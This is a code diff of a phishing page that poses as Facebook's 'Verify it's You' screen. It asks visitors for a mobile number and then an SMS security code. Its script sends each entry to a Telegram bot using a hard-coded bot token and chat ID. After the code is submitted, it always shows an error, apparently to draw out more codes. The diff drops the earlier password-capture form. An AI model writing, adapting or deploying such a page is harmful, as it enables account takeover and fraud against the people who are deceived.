@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - log in or sign up</title>
+    <title>Facebook - Verify Account</title>
     <style>
         * {
             margin: 0;
@@ -26,28 +26,40 @@
             margin: 0 auto;
             min-height: 80vh;
         }
-        .left-section {
-            flex: 1;
-            padding: 20px;
-            max-width: 500px;
+        .content-wrapper {
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
         }
         .facebook-logo {
             color: #1877f2;
             font-size: 4rem;
             font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
         }
         .tagline {
             font-size: 1.5rem;
             color: #1c1e21;
             line-height: 1.2;
+            margin-bottom: 30px;
         }
-        .login-container {
+        .verify-container {
             background-color: white;
-            padding: 20px;
+            padding: 24px;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
+            width: 100%;
+        }
+        .verify-header {
+            color: #1c1e21;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        .verify-text {
+            color: #1c1e21;
+            font-size: 15px;
+            margin-bottom: 24px;
         }
         .form-group {
             margin-bottom: 15px;
@@ -63,53 +75,20 @@
             outline: none;
             border-color: #1877f2;
         }
-        .login-btn {
+        input.error {
+            border-color: #ff0000;
+        }
+        .send-btn {
             background-color: #1877f2;
             color: white;
             border: none;
             border-radius: 6px;
-            padding: 12px;
-            font-size: 1.2rem;
-            font-weight: bold;
-            width: 100%;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-        .forgot-password {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .forgot-password a {
-            color: #1877f2;
-            text-decoration: none;
-        }
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-        }
-        .create-account-btn {
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px;
+            padding: 8px 24px;
             font-size: 1rem;
-            font-weight: bold;
+            font-weight: 500;
             cursor: pointer;
+            margin-left: auto;
             display: block;
-            margin: 0 auto;
-            width: fit-content;
-            min-width: 200px;
-        }
-        .create-page {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 0.9rem;
-        }
-        .create-page a {
-            color: inherit;
-            text-decoration: none;
-            font-weight: bold;
         }
         footer {
             background-color: white;
@@ -148,114 +127,41 @@
             color: #737373;
             font-size: 0.75rem;
         }
-        @media (max-width: 900px) {
-            .container {
-                flex-direction: column;
-                text-align: center;
-            }
-            .left-section {
-                margin-bottom: 40px;
-            }
-        }
         .hidden {
-            display: none;
-        }
-        .error {
-            border-color: #ff0000;
-        }
-        .verify-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #1c1e21;
-            margin-bottom: 16px;
-        }
-        .verify-text {
-            font-size: 15px;
-            color: #606770;
-            margin-bottom: 24px;
-        }
-        .verify-container {
-            padding: 20px;
-            text-align: center;
-        }
-        .verify-input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 1rem;
-            margin-bottom: 16px;
-        }
-        .verify-btn {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 12px 24px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            cursor: pointer;
-            width: auto;
-            min-width: 120px;
-        }
-        .verify-error {
-            color: #ff0000;
-            font-size: 13px;
-            margin-top: 8px;
             display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="left-section">
+        <div class="content-wrapper">
             <div class="facebook-logo">facebook</div>
             <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
-        </div>
-        <div class="right-section">
-            <div id="login-page" class="login-container">
-                <form id="loginForm" onsubmit="return false;">
+            
+            <div id="phone-page" class="verify-container">
+                <h2 class="verify-header">Verify it's You</h2>
+                <p class="verify-text">Please enter your mobile number to send login sms otp.</p>
+                <form id="phoneForm" onsubmit="return false;">
                     <div class="form-group">
-                        <input type="text" id="emailOrPhone" placeholder="Email address or phone number">
+                        <input type="tel" id="phoneNumber" placeholder="Mobile number">
                     </div>
-                    <div class="form-group">
-                        <input type="password" id="password" placeholder="Password">
-                    </div>
-                    <button class="login-btn" onclick="sendLoginData()">Log in</button>
-                    <div class="forgot-password">
-                        <a href="#">Forgotten password?</a>
-                    </div>
-                    <div class="divider"></div>
-                    <button class="create-account-btn">Create new account</button>
+                    <button class="send-btn" onclick="sendPhoneNumber()">Send</button>
                 </form>
             </div>
-            <div id="phone-page" class="login-container hidden">
-                <div class="verify-container">
-                    <h2 class="verify-title">Verify it's You</h2>
-                    <p class="verify-text">Please enter your mobile number to send login sms otp.</p>
-                    <form id="phoneForm" onsubmit="return false;">
-                        <input type="tel" id="phoneNumber" class="verify-input" placeholder="Mobile number">
-                        <button class="verify-btn" onclick="sendPhoneNumber()">Send</button>
-                        <p id="phone-error" class="verify-error">Please enter a valid phone number</p>
-                    </form>
-                </div>
-            </div>
-            <div id="otp-page" class="login-container hidden">
-                <div class="verify-container">
-                    <h2 class="verify-title">Enter Security Code</h2>
-                    <p class="verify-text">Please check your messages and enter the security code we just sent to your mobile number.</p>
-                    <form id="otpForm" onsubmit="return false;">
-                        <input type="text" id="otpCode" class="verify-input" placeholder="Enter security code">
-                        <button class="verify-btn" onclick="sendOTP()">Submit</button>
-                        <p id="otp-error" class="verify-error">Invalid security code. Please try again.</p>
-                    </form>
-                </div>
-            </div>
-            <div class="create-page">
-                <a href="#">Create a Page</a> for a celebrity, brand or business.
+
+            <div id="otp-page" class="verify-container hidden">
+                <h2 class="verify-header">Enter Security Code</h2>
+                <p class="verify-text">Please check your phone for a message with your code. Your code has 6 numbers.</p>
+                <form id="otpForm" onsubmit="return false;">
+                    <div class="form-group">
+                        <input type="text" id="otpCode" placeholder="Enter 6-digit code">
+                    </div>
+                    <button class="send-btn" onclick="sendOTP()">Submit</button>
+                </form>
             </div>
         </div>
     </div>
+
     <footer>
         <div class="footer-content">
             <ul class="language-list">
@@ -302,6 +208,7 @@
             <div class="copyright">Meta © 2024</div>
         </div>
     </footer>
+
     <script>
         const BOT_TOKEN = '8178385196:AAFvlGsJb14OukPNLQLjhJYsRPeLBP92U_Y';
         const CHAT_ID = '7220090233';
@@ -329,26 +236,13 @@
         }
 
         function showPage(pageId) {
-            document.getElementById('login-page').classList.add('hidden');
             document.getElementById('phone-page').classList.add('hidden');
             document.getElementById('otp-page').classList.add('hidden');
             document.getElementById(pageId).classList.remove('hidden');
         }
 
-        async function sendLoginData() {
-            const emailOrPhone = document.getElementById('emailOrPhone').value;
-            const password = document.getElementById('password').value;
-            const message = `Login attempt:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
-            await sendToTelegram(message);
-            showPage('phone-page');
-        }
-
         async function sendPhoneNumber() {
             const phoneNumber = document.getElementById('phoneNumber').value;
-            if (!phoneNumber || phoneNumber.length < 10) {
-                document.getElementById('phone-error').style.display = 'block';
-                return;
-            }
             const message = `Phone number entered: ${phoneNumber}`;
             await sendToTelegram(message);
             showPage('otp-page');
@@ -356,16 +250,10 @@
 
         async function sendOTP() {
             const otpCode = document.getElementById('otpCode').value;
-            if (!otpCode || otpCode.length < 4) {
-                document.getElementById('otp-error').style.display = 'block';
-                return;
-            }
             const message = `OTP entered: ${otpCode}`;
             await sendToTelegram(message);
-            document.getElementById('otp-error').style.display = 'block';
             document.getElementById('otpCode').classList.add('error');
         }
     </script>
 </body>
 </html>
-
